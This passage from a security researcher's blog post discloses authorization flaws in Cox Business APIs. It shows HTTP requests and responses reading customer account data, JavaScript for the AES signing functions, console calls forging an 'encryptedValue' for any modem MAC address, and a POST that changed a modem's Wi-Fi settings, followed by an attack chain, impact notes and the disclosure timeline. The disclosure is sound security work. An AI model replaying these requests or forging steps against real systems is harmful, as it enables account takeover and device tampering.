<h3 id="accessing-and-updating-any-cox-business-customer-account">Accessing and Updating any Cox Business Customer Account</h3>
<p>To test if this could be abused to access and modify business customer accounts, I found an API request which could query customers via email. I sent the following HTTP request and saw the following response:</p>
<pre><code class="__className_8a4d12"><span class="hljs-string">GET</span> <span class="hljs-string">/api/cbma/user/services/user/admin@cox.net</span> <span class="hljs-string">HTTP/1.1</span>
<span class="hljs-attr">Host:</span> <span class="hljs-string">myaccount-business.cox.com</span>
</code></pre>
<pre><code class="__className_8a4d12"><span class="hljs-string">HTTP/1.1</span> <span class="hljs-number">200</span> <span class="hljs-string">OK</span>
<span class="hljs-attr">Content-type:</span> <span class="hljs-string">application/json</span>

{
  <span class="hljs-attr">&quot;id&quot;:</span> <span class="hljs-string">&quot;admin@cox.net&quot;</span>,
  <span class="hljs-attr">&quot;guid&quot;:</span> <span class="hljs-string">&quot;89d6db21-402d-4a57-a87b-cad85d01b192&quot;</span>,
  <span class="hljs-attr">&quot;email&quot;:</span> <span class="hljs-string">&quot;admin@cox.net&quot;</span>,
  <span class="hljs-attr">&quot;firstName&quot;:</span> <span class="hljs-string">&quot;Redacted&quot;</span>,
  <span class="hljs-attr">&quot;lastName&quot;:</span> <span class="hljs-string">&quot;Redacted&quot;</span>,
  <span class="hljs-attr">&quot;primaryPhone&quot;:</span> <span class="hljs-string">&quot;Redacted&quot;</span>,
  <span class="hljs-attr">&quot;status&quot;:</span> <span class="hljs-string">&quot;INACTIVE&quot;</span>,
  <span class="hljs-attr">&quot;type&quot;:</span> <span class="hljs-string">&quot;RETAIL&quot;</span>,
  <span class="hljs-attr">&quot;profileAdmin&quot;:</span> <span class="hljs-literal">true</span>,
  <span class="hljs-attr">&quot;profileOwner&quot;:</span> <span class="hljs-literal">true</span>,
  <span class="hljs-attr">&quot;isCpniSetupRequired&quot;:</span> <span class="hljs-literal">false</span>,
  <span class="hljs-attr">&quot;isPasswordChangeRequired&quot;:</span> <span class="hljs-literal">true</span>,
  <span class="hljs-attr">&quot;timeZone&quot;:</span> <span class="hljs-string">&quot;EST&quot;</span>,
  <span class="hljs-attr">&quot;userType&quot;:</span> <span class="hljs-string">&quot;PROFILE_OWNER&quot;</span>,
  <span class="hljs-attr">&quot;userProfileDetails&quot;:</span> {
    <span class="hljs-attr">&quot;id&quot;:</span> <span class="hljs-string">&quot;{3DES}JA1+doxmDYc=&quot;</span>,
    <span class="hljs-attr">&quot;guid&quot;:</span> <span class="hljs-string">&quot;9795bd4c-92d6-4aa2-ad30-1da4bbcbe1da&quot;</span>,
    <span class="hljs-attr">&quot;name&quot;:</span> <span class="hljs-string">&quot;Supreme Carpet Care&quot;</span>,
    <span class="hljs-attr">&quot;status&quot;:</span> <span class="hljs-string">&quot;ACTIVE&quot;</span>,
    <span class="hljs-attr">&quot;ownerEmail&quot;:</span> <span class="hljs-string">&quot;admin@cox.net&quot;</span>
  },
  <span class="hljs-attr">&quot;contactType&quot;:</span> {
    <span class="hljs-attr">&quot;contactInfo&quot;:</span> [
      {
        <span class="hljs-attr">&quot;type&quot;:</span> <span class="hljs-string">&quot;alternateEmail&quot;</span>,
        <span class="hljs-attr">&quot;value&quot;:</span> <span class="hljs-string">&quot;redacted@redacted.com&quot;</span>
      }
    ]
  },
  <span class="hljs-attr">&quot;preferredEmail&quot;:</span> <span class="hljs-string">&quot;admin@cox.net&quot;</span>
}
</code></pre>
<p>Another similar POST account update request worked. This confirmed we could read and write to business accounts.</p>
<p>At this point, I&#x27;d demonstrated that it was possible to (1) search a customer and retrieve their business account PII using only their name, then (2) retrieve the MAC addresses of the connected hardware on their account, then (3) run commands against the MAC address via the API. It was time to find some API endpoints that actually wrote to the device to simulate an attacker attempting to get code execution.</p>
<h3 id="overwriting-anyones-device-settings-via-leaked-cryptographic-secret">Overwriting Anyone&#x27;s Device Settings via Leaked Cryptographic Secret</h3>
<p>Looking through the swagger docs, it seemed that every hardware modification requests (e.g. update device password) required a parameter called <code class="__className_8a4d12">encryptedValue</code>. If I could find a way to generate this value, then I could demonstrate write access to modems which would lead to remote code execution.</p>
<p>To know if I could even generate this <code class="__className_8a4d12">encryptedValue</code> parameter, I had to dig through the original JavaScript to figure out exactly how it was being signed.</p>
<p><figure class="prose-img flex flex-col items-center"><img alt="JS" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" style="color:transparent;width:100%;height:auto" sizes="100vw" srcSet="/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=3840&amp;q=75 3840w" src="/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=3840&amp;q=75"/><figcaption>JS</figcaption></figure></p>
<p>After tracing the <code class="__className_8a4d12">encryptedValue</code> parameter back through the JavaScript, I landed on these two functions:</p>
<pre><code class="__className_8a4d12"><span class="hljs-title function_">encryptWithSaltandPadding</span>(<span class="hljs-params">D</span>) {
    <span class="hljs-keyword">const</span> k = n.<span class="hljs-property">AES</span>.<span class="hljs-title function_">encrypt</span>(D, <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getKey</span>(), {
        <span class="hljs-attr">iv</span>: n.<span class="hljs-property">enc</span>.<span class="hljs-property">Hex</span>.<span class="hljs-title function_">parse</span>(s.<span class="hljs-property">IV</span>)
    }).<span class="hljs-property">ciphertext</span>.<span class="hljs-title function_">toString</span>(n.<span class="hljs-property">enc</span>.<span class="hljs-property">Base64</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">btoa</span>(s.<span class="hljs-property">IV</span> + <span class="hljs-string">&quot;::&quot;</span> + s.<span class="hljs-property">qs</span> + <span class="hljs-string">&quot;::&quot;</span> + k)
}
</code></pre>
<pre><code class="__className_8a4d12"><span class="hljs-title function_">decryptWithSaltandPadding</span>(<span class="hljs-params">D</span>) {
    <span class="hljs-keyword">const</span> W = <span class="hljs-title function_">atob</span>(D),
        k = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">sanitize</span>(W.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;::&quot;</span>)[<span class="hljs-number">2</span>]),
        M = n.<span class="hljs-property">lib</span>.<span class="hljs-property">CipherParams</span>.<span class="hljs-title function_">create</span>({
            <span class="hljs-attr">ciphertext</span>: n.<span class="hljs-property">enc</span>.<span class="hljs-property">Base64</span>.<span class="hljs-title function_">parse</span>(k)
        });
    <span class="hljs-keyword">return</span> n.<span class="hljs-property">AES</span>.<span class="hljs-title function_">decrypt</span>(M, <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getKey</span>(), {
        <span class="hljs-attr">iv</span>: n.<span class="hljs-property">enc</span>.<span class="hljs-property">Hex</span>.<span class="hljs-title function_">parse</span>(s.<span class="hljs-property">IV</span>)
    }).<span class="hljs-title function_">toString</span>(n.<span class="hljs-property">enc</span>.<span class="hljs-property">Utf8</span>)
}
</code></pre>
<p>Both of these functions took in variables which only existed at runtime, so the easiest way to actually call these functions would be to find somewhere it was called within the actual UI. After searching for a little while, I’d realized that the 4-digit PIN that I set when registering my account was encrypted using the same function!</p>
<p><figure class="prose-img flex flex-col items-center"><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" style="color:transparent;width:100%;height:auto" sizes="100vw" srcSet="/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=3840&amp;q=75 3840w" src="/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=3840&amp;q=75"/><figcaption></figcaption></figure></p>
<p>I set a breakpoint at exactly where the <code class="__className_8a4d12">encryptWithSaltAndPadding</code> function was called, then hit enter.</p>
<p><figure class="prose-img flex flex-col items-center"><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" style="color:transparent;width:100%;height:auto" sizes="100vw" srcSet="/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=3840&amp;q=75 3840w" src="/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=3840&amp;q=75"/><figcaption></figcaption></figure></p>
<p>Now that I had a breakpoint set and I was in the correct context for the function I could simply paste the function into my console and run whatever I wanted. To validate that it worked, I copied the encrypted value of the PIN code that was sent in the POST request and passed it to the decrypt function.</p>
<pre><code class="__className_8a4d12">t.<span class="hljs-property">cbHelper</span>.<span class="hljs-title function_">decryptWithSaltandPadding</span>(<span class="hljs-string">&quot;OGEzMjNmNjFhOTk2MGI2OTM0NzAzNTkzODZkOGYxODI6OjhhNzU1NTNlMDAzOTlhNWQ5Zjk5ZTYzMzM3M2RiYWUzOjova3paY1orSjRGR0YwWGFvRkhwWHZRPT0=&quot;</span>)
<span class="hljs-string">&quot;8042&quot;</span>
</code></pre>
<p>Perfect! It worked as expected. The only issue now was getting the encrypted value of a device. I asked around for a while until I found a friend who owned a MSP a few states away who used Cox Business. They gave me a login to their account and I saw what appeared to be an <code class="__className_8a4d12">encryptedValue</code> parameter in one of the HTTP responses after authenticating into their account. I copied this value and passed it to the decrypt function once again:</p>
<pre><code class="__className_8a4d12">t.<span class="hljs-property">cbHelper</span>.<span class="hljs-title function_">decryptWithSaltandPadding</span>(<span class="hljs-string">&quot;OGEzMjNmNjFhOTk2MGI2OTM0NzAzNTkzODZkOGYxODI6OjhhNzU1NTNlMDAzOTlhNWQ5Zjk5ZTYzMzM3M2RiYWUzOjpiYk1SNGQybzFLZHhRQ1VQNnF2TWl1QlZ0NEp6WVUyckJGMXF5T0dYTVlaNWdjZkhISTZnUFppdjM3dmtRSUcxclNkMC9WNmV2WFE1eko0VnFZUnFodz09&quot;</span>)
<span class="hljs-number">541051614702</span>;<span class="hljs-title class_">DTC4131</span>;<span class="hljs-number">333415591</span>;<span class="hljs-number">1</span>;<span class="hljs-attr">f4</span>:<span class="hljs-attr">c1</span>:<span class="hljs-number">14</span>:<span class="hljs-number">70</span>:4<span class="hljs-attr">d</span>:ac;<span class="hljs-title class_">Internet</span>
</code></pre>
<p>Well, that’s annoying. It looked like the encrypted parameter had the MAC address, but also an account ID and a few extra parameters.</p>
<pre><code class="__className_8a4d12"><span class="hljs-number">541051614702</span> <span class="hljs-string">=</span> <span class="hljs-string">Cox</span> <span class="hljs-string">Account</span> <span class="hljs-string">Number</span>
<span class="hljs-string">DTC4131</span> <span class="hljs-string">=</span> <span class="hljs-string">Device</span> <span class="hljs-string">Name</span>
<span class="hljs-number">333415592</span> <span class="hljs-string">=</span> <span class="hljs-string">Device</span> <span class="hljs-string">ID</span>
<span class="hljs-number">1</span> <span class="hljs-string">=</span> <span class="hljs-string">Unknown</span>
<span class="hljs-string">f4:c1:14:70:4d:ac</span> <span class="hljs-string">=</span> <span class="hljs-string">MAC</span> <span class="hljs-string">address</span>
<span class="hljs-string">Internet</span> <span class="hljs-string">=</span> <span class="hljs-string">Label</span>
</code></pre>
<p>If there was some validation which checked that the MAC address matched the account ID it would make exploiting this somewhat complicated. I investigated further.</p>
<h2 id="executing-commands-on-any-modem">Executing Commands on Any Modem</h2>
<p>On a leap of faith, I tried signing an “encryptedValue” string with junk data for everything except the MAC address (e.g. <code class="__className_8a4d12">123456789012;1234567;123456789;1;f4:c1:14:70:4d:ac;ANYTHING</code>) to see if it actually validated that the account ID matched the MAC address:</p>
<pre><code class="__className_8a4d12">t.<span class="hljs-property">cbHelper</span>.<span class="hljs-title function_">encryptWithSaltandPadding</span>(<span class="hljs-string">&quot;123456789012;1234567;123456789;1;f4:c1:14:70:4d:ac;ANYTHING&quot;</span>)
<span class="hljs-title class_">OGEzMjNmNjFhOTk</span>2MGI2OTM0NzAzNTkzODZkOGYxODI6OjhhNzU1NTNlMDAzOTlhNWQ5Zjk5ZTYzMzM3M2RiYWUzOjpLUlArd3Jqek5Ra3VlZUVReXVUWEZHbE91NWVQRzk0WEo1Zi9wSDdVZWxHVkFXYmtWd2Z2YmNHU1FWOVRFT2prZm5tNFhWZlQwNkQ3V2tDU1FqbHpIUT09
</code></pre>
<p>The only thing in the above parameter that was valid was the device serial number. If this request worked, it meant that I could use an “encryptedValue” parameter in the API that didn’t have to have a matching account ID.</p>
<p>I sent the request and saw the exact same HTTP response as above! This confirmed that we didn’t need any extra parameters, we could just query any hardware device arbitrarily by just knowing the MAC address (something that we could retrieve by querying a customer by name, fetching their account UUID, then fetching all of their connected devices via their UUID). We now had essentially a full kill chain.</p>
<p>I formed the following HTTP request to update my own device MAC addresses SSID as a proof of concept to update my own hardware:</p>
<pre><code class="__className_8a4d12"><span class="hljs-string">POST</span> <span class="hljs-string">/api/cbma/accountequipment/services/accountequipment/gatewaydevice/wifisettings</span> <span class="hljs-string">HTTP/1.1</span>
<span class="hljs-attr">Host:</span> <span class="hljs-string">myaccount-business.cox.com</span>
<span class="hljs-attr">User-Agent:</span> <span class="hljs-string">Mozilla/5.0</span> <span class="hljs-string">(Windows</span> <span class="hljs-string">NT</span> <span class="hljs-number">10.0</span><span class="hljs-string">;</span> <span class="hljs-string">Win64;</span> <span class="hljs-string">x64;</span> <span class="hljs-string">rv:123.0)</span> <span class="hljs-string">Gecko/20100101</span> <span class="hljs-string">Firefox/123.0</span>
<span class="hljs-attr">Accept:</span> <span class="hljs-string">application/json,</span> <span class="hljs-string">text/plain,</span> <span class="hljs-string">*/*</span>
<span class="hljs-attr">Clientid:</span> <span class="hljs-string">cbmauser</span>
<span class="hljs-attr">Apikey:</span> <span class="hljs-string">5d228662-aaa1-4a18-be1c-fb84db78cf13</span>
<span class="hljs-attr">Cb_session:</span> <span class="hljs-string">unauthenticateduser</span>
<span class="hljs-attr">Authorization:</span> <span class="hljs-string">Bearer</span> <span class="hljs-string">undefined</span>
<span class="hljs-attr">Ma_transaction_id:</span> <span class="hljs-number">56583255</span><span class="hljs-string">-1cf3-41aa-9600-3d5585152e87</span>
<span class="hljs-attr">Connection:</span> <span class="hljs-string">close</span>
<span class="hljs-attr">Content-Type:</span> <span class="hljs-string">application/json</span>
<span class="hljs-attr">Content-Length:</span> <span class="hljs-number">431</span>

{
  <span class="hljs-attr">&quot;wifiSettings&quot;:</span> {
    <span class="hljs-attr">&quot;customerWifiSsid24&quot;:</span> <span class="hljs-string">&quot;Curry&quot;</span>
  },
  <span class="hljs-attr">&quot;additionalProperties&quot;:</span> {
    <span class="hljs-attr">&quot;customerWifiSsid24&quot;:</span> [
      <span class="hljs-string">&quot;Curry&quot;</span>
    ]
  },
  <span class="hljs-attr">&quot;encryptedValue&quot;:</span> <span class="hljs-string">&quot;T0dFek1qTm1OakZoT1RrMk1HSTJPVE0wTnpBek5Ua3pPRFprT0dZeE9ESTZPamhoTnpVMU5UTmxNREF6T1RsaE5XUTVaams1WlRZek16TTNNMlJpWVdVek9qcENVMlp1TjJ0blVsTkNlR1ZhZDJsd05qZGhjWFo0TTJsaVJHSkhlU3N2TUhWVWFYZzJWVTByYzNsT2RYWklMek16VjJ4VldFYzJTMWx5VEVNMVRuSkxOVVF3VFhFek9UVmlUR2RGVFd4RUt6aGFUMnhoZHowOQ==&quot;</span>
}
</code></pre>
<pre><code class="__className_8a4d12">HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK
Server<span class="hljs-punctuation">:</span> nginx

<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Success&quot;</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>Did it work? It had only given me a blank 200 OK response. I tried re-sending the HTTP request, but the request timed out. My network was offline. The update request must&#x27;ve reset my device.</p>
<p>About 5 minutes later, my network rebooted. The SSID name had been updated to “Curry”. I could write and read from anyone&#x27;s device using this exploit.</p>
<p><figure class="prose-img flex flex-col items-center"><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" style="color:transparent;width:100%;height:auto" sizes="100vw" srcSet="/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=3840&amp;q=75 3840w" src="/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=3840&amp;q=75"/><figcaption></figcaption></figure></p>
<p>This demonstrated that the API calls to update the device configuration worked. This meant that an attacker could&#x27;ve accessed this API to overwrite configuration settings, access the router, and execute commands on the device. At this point, we had a similar set of permissions as the ISP tech support and could&#x27;ve used this access to exploit any of the millions of Cox devices that were accessible through these APIs.</p>
<p>I reached out to Cox via their responsible disclosure page and shared details of the vulnerability. They took down the exposed API calls within six hours then began working on the authorization vulnerabilities. I was no longer able to reproduce any of the vulnerabilities the next day.</p>
<h2 id="impact">Impact</h2>
<p>This series of vulnerabilities demonstrated a way in which a fully external attacker with no prerequisites could&#x27;ve executed commands and modified the settings of millions of modems, accessed any business customer&#x27;s PII, and gained essentially the same permissions of an ISP support team.</p>
<p>Cox is the largest private broadband provider in the United States, the third-largest cable television provider, and the seventh largest telephone carrier in the country. They have millions of customers and are the most popular ISP in 10 states.</p>
<p>An example attack scenario would&#x27;ve looked like the following:</p>
<ol>
<li>Search for a Cox business target through the exposed APIs using their name, phone number, email address, or account number</li>
<li>Retrieve their full account PII via querying the returned UUID from step one including device MAC addresses, email, phone number, and address</li>
<li>Query their hardware MAC address to retrieve Wifi password and connected devices</li>
<li>Execute arbitrary commands, update any device property, and takeover victim accounts</li>
</ol>
<p>There were over 700 exposed APIs with many giving administrative functionality (e.g. querying the connected devices of a modem). Each API suffered from the same permission issues where replaying HTTP requests repeatedly would allow an attacker to run unauthorized commands.</p>
<h2 id="addendum">Addendum</h2>
<p>After reporting the vulnerability to Cox, they investigated if the specific vector had ever been maliciously exploited in the past and found no history of abuse (the service I found the vulnerabilities in had gone live in 2023, while my device had been compromised in 2021). They had also informed me that they had no affiliation with the DigitalOcean IP address, meaning that the device had definitely been hacked, just not using the method disclosed in this blog post.</p>
<p>I&#x27;m still super curious on the exact way in which my device was compromised as I had never made my modem externally accessible nor even logged into the device from my home network. This blog post really aims to highlight vulnerabilities in the layer of trust between the ISP and customer devices, but the modem could&#x27;ve been compromised by some other much more boring method (e.g. local CSRF to RCE 0day which I triggered locally within my home network).</p>
<p>One of the things I&#x27;ll never understand was why the attacker was replaying my traffic? They were clearly in my network and could access everything without being detected, why replay all the HTTP requests? So odd.</p>
<p>Anyway, thanks for reading! More than happy to listen to any theories, comments, or whatever about what happened here. Feel free to reach out at samwcurry (symbol goes here) gmail (dot goes here) com.</p>
<h2 id="timeline">Timeline</h2>
<ul>
<li>03/04/2024 - Vulnerability reported to Cox via their <a href="https://www.cox.com/aboutus/policies/cox-security-responsible-disclosure-policy.html" class="text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors text-normal">responsible disclosure program</a></li>
<li>03/05/2024 - Vulnerability is hot-patched, all non-essential business endpoints return 403 and no longer function</li>
<li>03/06/2024 - Email Cox that I can no longer reproduce the vulnerability</li>
<li>03/07/2024 - Cox writes that they are beginning a comprehensive security review</li>
<li>04/10/2024 - Informed Cox of intent to disclose 90 days from disclosure</li>
<li>04/29/2024 - Shared link to blog post draft with Cox</li>
</ul>
<h2 id="thanks">Thanks</h2>
<ul>
<li>Thanks to <a href="https://twitter.com/blastbots" class="text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors text-normal">@blastbots</a> for the full redesign of the blog, I can now write posts in markdown and have an RSS feed!</li>
<li>Thanks to <a href="https://twitter.com/sshell_" class="text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors text-normal">Justin Rhinehart</a> and <a href="https://twitter.com/birchb0y" class="text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors text-normal">Alden</a> for working closely with me for the investigation process, providing tons of help doing OSINT stuff.</li>
<li>Thanks to <a href="https://twitter.com/galnagli" class="text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors text-normal">Gal Nagli</a>, <a href="https://twitter.com/bbuerhaus" class="text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors text-normal">Brett Buerhaus</a>, <a href="https://twitter.com/avlidienbrunn" class="text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors text-normal">Mathias Karlsson</a>, <a href="https://twitter.com/d0nutptr" class="text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors text-normal">Nathanial Lattimer</a>, <a href="https://twitter.com/xEHLE_" class="text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors text-normal">Maik Robert</a>, <a href="https://twitter.com/infosec_au" class="text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors text-normal">Shubham Shah</a>, <a href="https://twitter.com/0xteknogeek" class="text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors text-normal">Joel Margolis</a>, <a href="https://twitter.com/Rhynorater" class="text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors text-normal">Justin Gardner</a>, Daley Borda, <a href="https://twitter.com/umasiii" class="text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors text-normal">William Tom</a>, and Ebrietas for reviewing the draft version of this blog post.</li>
<li>Thanks to the Cox Communications security team for quickly fixing the issue and staying in touch throughout the process.</li>
</ul></div><div class="flex flex-col border-t pt-4 border-neutral-700"><span>Find me on:</span><span>twitter<!-- -->:<!-- --> <a class="underline text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors" href="https://twitter.com/samwcyo">https://twitter.com/samwcyo</a></span><span>discord<!-- -->: <!-- -->zlz</span></div></main><footer class="my-8 text-center flex flex-row gap-4 justify-center"><span class="hover:underline"><a href="/feed.rss">RSS</a></span><span class="hover:underline"><a href="https://twitter.com/samwcyo">Twitter</a></span></footer></div></div><script src="/_next/static/chunks/webpack-c41ac42b99ebfa5c.js" crossorigin="" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0]);self.__next_f.push([2,null])</script><script>self.__next_f.push([1,"1:HL[\"/_next/static/media/ec1a1eae803b668e-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n2:HL[\"/_next/static/css/6352103c9de7dc6b.css\",\"style\",{\"crossOrigin\":\"\"}]\n0:\"$L3\"\n"])</script><script>self.__next_f.push([1,"4:HL[\"/_next/static/media/f980ec13b5b5e554.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n5:HL[\"/_next/static/css/2f94dd838c46567f.css\",\"style\",{\"crossOrigin\":\"\"}]\n"])</script><script>self.__next_f.push([1,"6:I[4005,[],\"\"]\n9:I[357,[],\"\"]\nb:I[2984,[],\"\"]\nd:I[5389,[],\"\"]\na:[\"slug\",\"hacking-millions-of-modems\",\"d\"]\ne:[]\n"])</script><script>self.__next_f.push([1,"3:[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/6352103c9de7dc6b.css\",\"precedence\":\"next\",\"crossOrigin\":\"\"}]],[\"$\",\"$L6\",null,{\"buildId\":\"HDUJS0KkuA2piIdAZ824L\",\"assetPrefix\":\"\",\"initialCanonicalUrl\":\"/hacking-millions-of-modems\",\"initialTree\":[\"\",{\"children\":[[\"slug\",\"hacking-millions-of-modems\",\"d\"],{\"children\":[\"__PAGE__?{\\\"slug\\\":\\\"hacking-millions-of-modems\\\"}\",{}]}]},\"$undefined\",\"$undefined\",true],\"initialSeedData\":[\"\",{\"children\":[[\"slug\",\"hacking-millions-of-modems\",\"d\"],{\"children\":[\"__PAGE__\",{},[\"$L7\",\"$L8\",null]]},[\"$\",\"$L9\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"$a\",\"children\"],\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"loadingScripts\":\"$undefined\",\"hasLoading\":false,\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$Lb\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"styles\":[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/2f94dd838c46567f.css\",\"precedence\":\"next\",\"crossOrigin\":\"\"}]]}]]},[null,[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[[\"$\",\"head\",null,{\"children\":[\"$\",\"script\",null,{\"defer\":true,\"data-domain\":\"samcurry.net\",\"src\":\"https://plausible.io/js/script.js\"}]}],[\"$\",\"body\",null,{\"className\":\"__className_ac79ff subpixel-antialiased py-12 px-4 flex flex-row justify-center dark:[color-scheme:dark]\",\"children\":[\"$\",\"$L9\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"loadingScripts\":\"$undefined\",\"hasLoading\":false,\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$Lb\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":\"404\"}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be 